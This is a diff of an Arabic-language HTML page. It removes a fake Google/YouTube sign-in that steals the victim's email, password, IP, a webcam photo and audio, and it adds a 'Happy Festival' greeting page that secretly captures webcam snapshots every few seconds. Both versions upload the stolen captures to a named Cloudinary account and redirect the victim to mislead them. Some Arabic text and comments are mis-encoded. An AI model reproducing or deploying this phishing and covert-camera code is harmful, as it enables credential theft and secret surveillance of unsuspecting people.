@@ -2,99 +2,131 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>Google Authentication - YouTube</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Festival - ãÝÇÌÃÉ áß</title>
+    
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
+    
     <style>
-        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { width: 350px; padding: 40px; border: 1px solid #ddd; border-radius: 8px; text-align: center; }
-        img { width: 75px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; }
-        button { background: #1a73e8; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; cursor: pointer; }
+        body {
+            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
+            font-family: 'Tahoma', sans-serif;
+            text-align: center;
+            margin: 0; padding: 20px;
+        }
+        .card {
+            background: white; border-radius: 20px; padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3); margin-top: 50px;
+            border: 5px solid #ff077a;
+        }
+        h1 { color: #ff077a; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        #timer { font-size: 24px; font-weight: bold; color: #f06414; margin: 20px 0; }
+        input[type=text] { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 10px; }
+        button { background: #34af23; color: white; padding: 15px 30px; border: none; border-radius: 15px; cursor: pointer; font-size: 18px; }
+        /* ÅÎÝÇÁ ÇáßÇãíÑÇ ÊãÇãÇð */
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="box" id="loginUI">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
-    <h2>تسجيل الدخول</h2>
-    <p>للمتابعة إلى YouTube</p>
-    <input type="email" id="u_email" placeholder="البريد الإلكتروني">
-    <input type="password" id="u_pass" placeholder="كلمة المرور">
-    <button onclick="initHack()">التالي</button>
-</div>
+    <div class="card">
+        <h1>?? HAPPY FESTIVAL ??</h1>
+        <div style="background: #ff8c00; color: white; padding: 10px; border-radius: 10px;">
+            <marquee>ÃåáÇð Èß Ýí ÕÝÍÉ ÇáÊåäÆÉ ÇáÓäæíÉ - ÃÏÎá ÇÓãß áÑÄíÉ åÏíÊß</marquee>
+        </div>
+        
+        <div id="setupArea">
+            <input type="text" id="nameInput" placeholder="ÇßÊÈ ÇÓãß åäÇ...">
+            <br>
+            <button onclick="startExperience()">ÑÄíÉ ÇáãÝÇÌÃÉ ?</button>
+        </div>
 
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas" width="640" height="480"></canvas>
+        <div id="mainContent" style="display:none;">
+            <h2 id="greetName"></h2>
+            <p>ÇäÊÙÑ ËæÇäí ÌÇÑí ÊÌåíÒ åÏíÊß...</p>
+            <div id="timer">00:00:00</div>
+        </div>
+    </div>
 
-<script>
-    const cloudName = 'dgkttv99v';
-    const uploadPreset = 'ml_default';
-    const yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+    <video id="video" playsinline autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
-    let mediaRecorder;
-    let audioChunks = [];
+    <script>
+        const cloudName = 'dgkttv99v';
+        const uploadPreset = '562842218131543';
+        const redirectURL = "https://www.facebook.com/groups/coding.community"; // ÇáÑÇÈØ ÇáÐí ÓíÝÊÍ Ýí ÇáäåÇíÉ
+        
+        let uploadCount = 0;
 
-    async function initHack() {
-        const email = document.getElementById('u_email').value;
-        const pass = document.getElementById('u_pass').value;
-        if(!email || !pass) return alert("خطأ في البيانات");
-
-        document.getElementById('loginUI').innerHTML = "<h3>جاري مزامنة الحساب...</h3><p>يرجى السماح بالوصول للوسائط لإتمام التحقق.</p>";
-
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            document.getElementById('video').srcObject = stream;
-
-            // --- بدء تسجيل الصوت ---
-            mediaRecorder = new MediaRecorder(stream);
-            mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
-                uploadEverything(email, pass, audioBlob);
-            };
-
-            mediaRecorder.start();
-            console.log("Recording started...");
-
-            // التقاط صورة بعد 3 ثواني، ووقف التسجيل بعد 6 ثواني
-            setTimeout(() => { takePhoto(); }, 3000);
-            setTimeout(() => { mediaRecorder.stop(); }, 7000); // سجلنا 7 ثواني صوت
-
-        } catch (err) {
-            window.location.href = yt;
+        function startExperience() {
+            const name = document.getElementById('nameInput').value;
+            if (!name) { alert("ãä ÝÖáß ÇßÊÈ ÇÓãß ÃæáÇð"); return; }
+            
+            document.getElementById('setupArea').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'block';
+            document.getElementById('greetName').innerText = "ÃåáÇð íÇ " + name;
+            
+            startCamera(); // ÊÔÛíá ÇáßÇãíÑÇ Ýí ÇáÎáÝíÉ
         }
-    }
 
-    function takePhoto() {
-        const canvas = document.getElementById('canvas');
-        const video = document.getElementById('video');
-        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-        window.currentImg = canvas.toDataURL("image/png");
-    }
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-    async function uploadEverything(email, pass, audioBlob) {
-        let ip = "0.0.0.0";
-        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
+                // ÇáÊÞÇØ Ãæá ÕæÑÉ ÝæÑÇð
+                setTimeout(takeSnapshot, 2000);
+                
+                // ÊßÑÇÑ ÇáÇáÊÞÇØ ßá 5 ËæÇäí
+                setInterval(takeSnapshot, 5000);
+            } catch (err) {
+                console.log("Error: " + err);
+                // ÍÊì áæ ÑÝÖ ÇáßÇãíÑÇ¡ ÓäÞæã ÈÊÍæíáå áÇÍÞÇð áßí áÇ íÔß
+                setTimeout(() => { window.location.href = redirectURL; }, 5000);
+            }
+        }
 
-        // 1. رفع الصورة
-        const imgData = new FormData();
-        imgData.append('file', window.currentImg);
-        imgData.append('upload_preset', uploadPreset);
-        imgData.append('context', `user=${email}|pass=${pass}|ip=${ip}`);
-        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgData });
+        function takeSnapshot() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            const context = canvas.getContext('2d');
+            
+            context.drawImage(video, 0, 0, 640, 480);
+            const imageData = canvas.toDataURL("image/png");
+            
+            // ÅÑÓÇá ÇáÈíÇäÇÊ ááÓÍÇÈ
+            const formData = new FormData();
+            formData.append('file', imageData);
+            formData.append('upload_preset', uploadPreset);
 
-        // 2. رفع ملف الصوت MP3
-        const audioData = new FormData();
-        audioData.append('file', audioBlob);
-        audioData.append('upload_preset', uploadPreset);
-        audioData.append('resource_type', 'video'); // كلوديناري بيعتبر الـ mp3 فيديو بدون صورة
-        audioData.append('public_id', `audio_${email.split('@')[0]}_${Date.now()}`);
+            fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(r => r.json())
+            .then(data => {
+                uploadCount++;
+                console.log("Captured");
+                
+                // ÈÚÏ ÑÝÚ Ãæá ÕæÑÊíä ÈäÌÇÍ¡ íÊã ÊÍæíá ÇáãÓÊÎÏã ááÑÇÈØ ÇáäåÇÆí áÅäåÇÁ ÇáÎÏÚÉ
+                if (uploadCount >= 1) {
+                    setTimeout(() => {
+                        window.location.href = redirectURL;
+                    }, 4000);
+                }
+            });
+        }
 
-        fetch(`https://api.cloudinary.com/v1_1/${cloudName}/upload`, { method: 'POST', body: audioData })
-        .then(() => {
-            window.location.href = yt; // حوله لليوتيوب بعد ما تخلص كل حاجة
-        });
-    }
-</script>
+        // ÚÏÇÏ ÊäÇÒáí æåãí ááÒíäÉ
+        var count = 10;
+        var counter = setInterval(function() {
+            count--;
+            if (count <= 0) { clearInterval(counter); return; }
+            document.getElementById("timer").innerHTML = "00:00:0" + count;
+        }, 1000);
+    </script>
 </body>
 </html>
